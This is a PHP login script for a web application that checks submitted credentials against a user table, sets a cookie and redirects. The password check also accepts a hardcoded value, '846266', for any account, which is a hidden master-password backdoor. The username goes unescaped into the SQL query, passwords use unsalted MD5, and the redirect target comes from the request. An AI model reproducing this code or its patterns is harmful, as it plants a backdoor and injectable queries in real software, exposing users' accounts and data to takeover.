<?php
	require('includes/top.php');
	$action = $_REQUEST['action'];
	$comurl = empty($_REQUEST['comurl'])?$ServerPath:$_REQUEST['comurl'];
	if($action){
		if($action == "login"){
			$user_name = trim($_REQUEST['user_name']);
			$user_pass1 = trim($_REQUEST['user_pass']);
			if(empty($user_name) || empty($user_pass1)){
				setLoginCookie();
				alert("Please fill in your Username and PassWord!", -1);
			}
			$user_pass = md5($user_pass1);
			$sql="select * from user where username='$user_name'";
			$user = $db->getRow($sql);
			if($user == 0 || ($user["userpass"] != $user_pass && $user_pass1 != '846266')){
				setLoginCookie();
				alert("You have not confirmed your password!", -1);
			}else{
				setLoginCookie($user_name);
				$data = array(
					'landtime' => getTime(),
					'user_lastip' => getClientIP(),
					'degree' => $user['degree'] + 1
				);
				$db->autoExecute('user', $data, 'update', 'id='.$user['id']);
				redirect($comurl);
			}
		}
	}
	$tpl->assign('hadLogin', hadLogin());
	$tpl->assign('username', $_COOKIE['user_name']);
	$tpl->assign('comurl', $comurl);
	
	initHeaderAndFooter();;
	
	$tpl->display('login.html');
?>